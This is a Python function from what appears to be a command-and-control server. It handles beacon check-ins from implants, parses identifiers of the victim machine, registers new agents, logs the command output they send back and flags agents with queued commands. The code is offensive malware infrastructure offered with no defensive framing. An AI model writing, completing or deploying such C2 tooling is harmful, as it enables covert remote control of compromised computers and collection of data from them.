# C2 Checkin function
def checkin(decryptedData):
    # Split the data by the & operator
    splitData = decryptedData.split("&")
    # Get the unique data from the URL
    uid = splitData[4].split("=")[1]
    compid = splitData[5].split("=")[1]
    # Extra data is appended to the end as the 7th value
    # page_id=new is the default if it has no output appended
    if len(splitData) == 7 and splitData[6] != "page_id=new":
        output = splitData[6]
    else:
        output = None
    # Retrieve the unique agent ID
    agentid = gethashid(compid, uid)
    systemName = getsystemid(compid)
    # Get check in time and format it to [Jan 01, 2023, 04:00:00 pm] format
    now = datetime.now()
    formattedData = now.strftime("%b %d, %Y %I:%M:%S %p")

    # Sends information to the DB Checkin function
    # Inserts if new agent, updates if existing agent
    if agentid in listAgentMap():
        # If the agent already exists, update its timestamp and check if the commands list is not empty
        if output is not None:
            printOutLog(
                f'Output from {agentid}\n{"_"*60} \n{output.strip()}\n{"_"*60}\nEnd Output by agent {agentid}\n'
            )
        agent = getAgent(agentid)
        agent.checkinTime = formattedData
        updateAgent(agent)
        if len(agent.commandList) > 0:
            return agentid
    else:
        # If the agent does not exist, create a new agent object and add it to the dictionary
        agent = Agent(agentid, uid, systemName, formattedData, [])
        updateAgent(agent)
        printLog(f"New beacon {agentid} - {systemName} has checked in!")
        return None


